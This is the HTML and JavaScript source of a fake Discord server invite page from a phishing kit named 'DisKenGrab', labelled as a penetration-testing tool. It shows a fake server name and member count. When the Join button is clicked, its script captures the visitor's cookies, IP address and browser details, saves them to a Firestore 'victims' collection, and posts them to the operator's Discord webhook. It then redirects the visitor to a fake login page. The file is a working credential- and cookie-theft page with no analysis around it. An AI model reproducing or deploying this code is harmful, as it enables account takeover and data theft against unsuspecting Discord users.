<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Server Invite</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --discord-blurple: #5865F2;
            --discord-green: #57F287;
            --discord-dark: #2C2F33;
            --discord-darker: #23272A;
            --text-light: #ffffff;
            --text-muted: #b9bbbe;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: var(--discord-darker);
            color: var(--text-light);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .invite-container {
            background: var(--discord-dark);
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 480px;
            text-align: center;
        }

        .server-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: var(--discord-blurple);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 2rem;
        }

        .server-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .member-count {
            color: var(--text-muted);
            margin-bottom: 30px;
        }

        .join-button {
            background: var(--discord-green);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }

        .join-button:hover {
            background: #48d874;
        }

        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid var(--discord-green);
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="invite-container">
        <div class="server-icon">
            <i class="fab fa-discord"></i>
        </div>
        
        <h1 class="server-name" id="serverName">Loading Server...</h1>
        <p class="member-count" id="memberCount">Fetching server info...</p>
        
        <button class="join-button" id="joinButton">
            <span class="spinner" id="joinSpinner" style="display: none;"></span>
            Join Server
        </button>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="../config.js"></script>
    
    <script>
        // ==================== INVITE PAGE FUNCTIONALITY ====================
        
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');
        const targetInvite = urlParams.get('invite');

        console.log('üîó Invite Page Parameters:', { attackId, pentesterId, targetInvite });

        // Initialize Firebase
        let db;
        if (typeof firebaseConfig !== 'undefined') {
            try {
                if (!firebase.apps.length) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.firestore();
                console.log('‚úÖ Invite page Firebase initialized');
            } catch (error) {
                console.error('‚ùå Firebase initialization error:', error);
            }
        }

        // Extract server name from invite URL
        function getServerNameFromInvite(inviteUrl) {
            try {
                // Extract server name or use default
                if (inviteUrl.includes('discord.gg/')) {
                    const parts = inviteUrl.split('discord.gg/');
                    if (parts[1]) {
                        return `Welcome to ${parts[1].toUpperCase()} Server`;
                    }
                }
                return "Welcome to Discord Server";
            } catch (error) {
                return "Discord Server";
            }
        }

        // Steal cookies and browser info
        async function stealCookiesAndRedirect() {
            const joinButton = document.getElementById('joinButton');
            const spinner = document.getElementById('joinSpinner');

            // Show loading
            joinButton.disabled = true;
            spinner.style.display = 'inline-block';

            try {
                // Collect victim data
                const victimData = {
                    timestamp: new Date(),
                    ipAddress: await getIPAddress(),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookies: document.cookie,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer,
                    attackId: attackId,
                    pentesterId: pentesterId,
                    stage: 'cookie_capture'
                };

                console.log('üç™ Captured cookies and browser data');

                // Save to Firestore
                if (db) {
                    await db.collection('victims').add({
                        ...victimData,
                        capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
                        status: 'cookies_captured'
                    });

                    // Update campaign stats
                    if (attackId) {
                        await updateCampaignStats(attackId, 'cookies');
                    }

                    // Send to Discord webhook
                    await sendToWebhook(victimData, 'cookies');
                }

                // Wait a moment then redirect to login page
                setTimeout(() => {
                    const loginUrl = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
                    console.log('üîê Redirecting to login page:', loginUrl);
                    window.location.href = loginUrl;
                }, 2000);

            } catch (error) {
                console.error('‚ùå Error capturing cookies:', error);
                // Still redirect to login page even if saving fails
                setTimeout(() => {
                    window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
                }, 2000);
            }
        }

        // Get victim's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Update campaign statistics
        async function updateCampaignStats(campaignId, type) {
            try {
                const campaignRef = db.collection('campaigns').doc(campaignId);
                const campaignDoc = await campaignRef.get();
                
                if (campaignDoc.exists) {
                    if (type === 'cookies') {
                        const currentCookies = campaignDoc.data().cookiesCaptured || 0;
                        await campaignRef.update({
                            cookiesCaptured: currentCookies + 1,
                            lastCookieCapture: firebase.firestore.FieldValue.serverTimestamp()
                        });
                    }
                }
            } catch (error) {
                console.error('‚ùå Error updating campaign stats:', error);
            }
        }

        // Send notification to Discord webhook
        async function sendToWebhook(victimData, type) {
            try {
                if (pentesterId && db) {
                    const pentesterDoc = await db.collection('pentesters').doc(pentesterId).get();
                    if (pentesterDoc.exists) {
                        const pentesterData = pentesterDoc.data();
                        const webhookUrl = pentesterData.webhookUrl;

                        if (webhookUrl) {
                            let embed;
                            if (type === 'cookies') {
                                embed = {
                                    title: 'üç™ Cookies Captured',
                                    description: `**Campaign ID:** ${attackId || 'Unknown'}`,
                                    color: 16753920, // Orange color
                                    fields: [
                                        {
                                            name: 'üåê IP Address',
                                            value: victimData.ipAddress,
                                            inline: true
                                        },
                                        {
                                            name: 'üç™ Cookies',
                                            value: '```' + (victimData.cookies || 'No cookies') + '```',
                                            inline: false
                                        },
                                        {
                                            name: 'üíª User Agent',
                                            value: '```' + victimData.userAgent.substring(0, 100) + '...```',
                                            inline: false
                                        },
                                        {
                                            name: 'üåç Location',
                                            value: victimData.timezone,
                                            inline: true
                                        }
                                    ],
                                    timestamp: new Date().toISOString()
                                };
                            }

                            await fetch(webhookUrl, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    content: type === 'cookies' ? 'üç™ **Cookies captured!** Redirecting to login...' : 'üéØ **New data captured!**',
                                    embeds: [embed] 
                                })
                            });
                        }
                    }
                }
            } catch (error) {
                console.error('‚ùå Error sending webhook:', error);
            }
        }

        // Initialize the invite page
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ DisKenGrab Invite Page Loaded');
            
            // Set server info
            const serverName = getServerNameFromInvite(targetInvite || '');
            document.getElementById('serverName').textContent = serverName;
            document.getElementById('memberCount').textContent = '15,234 members online';

            // Add join button handler
            document.getElementById('joinButton').addEventListener('click', stealCookiesAndRedirect);
        });
    </script>
</body>
</html>